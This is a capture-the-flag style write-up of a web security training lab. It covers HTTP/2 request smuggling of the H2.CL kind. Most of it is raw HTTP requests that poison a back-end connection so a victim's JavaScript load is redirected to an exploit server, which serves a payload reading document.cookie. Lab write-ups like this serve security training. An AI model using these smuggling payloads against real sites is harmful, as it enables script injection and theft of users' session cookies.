## H2.CL request smuggling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds.

Hint :

Solving this lab requires a technique that we covered in the earlier HTTP request smuggling materials

You need to poison the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, it will fetch your payload from the exploit server but not execute it. You may need to repeat the attack several times before you get the timing right.

## Notes

- Possibility to leave a comment
- Search page
- Exploit server
- `/login`
- `/resources/js/analyticsFetcher.js`

## Resume

1. Confirm H2.CL request smuggling
2. Confirm response queue poisoning
3. Abuse `/resources` redirect behavior
4. Redirect victims to the exploit server
5. Serve malicious JavaScript
6. Wait for a victim resource request
7. Execute JavaScript in the victim's browser

## Solve

Confirm H2.CL request smuggling:

```http
POST / HTTP/2
Host: 0ab900eb04d97baa811b435f00cd0090.web-security-academy.net
Content-Length: 0

SMUGGLED
```

Every second request receives a `404 Not Found` response.

This confirms that the back-end interprets the body differently from the front-end and appends the next request to the smuggled prefix.

Verify the `/resources` redirect behavior:

```http
GET /resources HTTP/2
Host: 0ab900eb04d97baa811b435f00cd0090.web-security-academy.net
```

Response:

```http
HTTP/2 301 Moved Permanently
Location: https://0ab900eb04d97baa811b435f00cd0090.web-security-academy.net/resources/
```

The application generates an absolute redirect using the `Host` header.

Create a smuggled request with an arbitrary host:

```http
POST / HTTP/2
Host: 0ab900eb04d97baa811b435f00cd0090.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1
```

After poisoning the connection, the next request on that back-end connection receives a redirect similar to:

```http
HTTP/1.1 301 Moved Permanently
Location: https://foo/resources/
```

This confirms that requests can be redirected to an attacker-controlled domain.

Configure the exploit server:

Path:

```text
/resources
```

Body:

```javascript
alert(document.cookie)
```

Store the exploit.

Now poison the connection using the exploit server host:

```http
POST / HTTP/2
Host: 0ab900eb04d97baa811b435f00cd0090.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0a8e003f04ac7bd48199423b01db0043.exploit-server.net
Content-Length: 5

x=1
```

When the next request reuses the poisoned connection, it receives:

```http
HTTP/1.1 301 Moved Permanently
Location: https://exploit-0a8e003f04ac7bd48199423b01db0043.exploit-server.net/resources/
```

The victim browser follows the redirect and loads the malicious JavaScript from the exploit server.

Verify exploitation through the exploit server access logs.

Successful victim requests appear as:

```http
GET /resources/ HTTP/1.1
```

Once the victim loads a JavaScript resource through the poisoned connection, the browser executes:

```javascript
alert(document.cookie)
```

Because the victim only periodically requests JavaScript resources, the attack generally requires several attempts. The goal is to poison the connection immediately before the victim imports a resource from `/resources/`.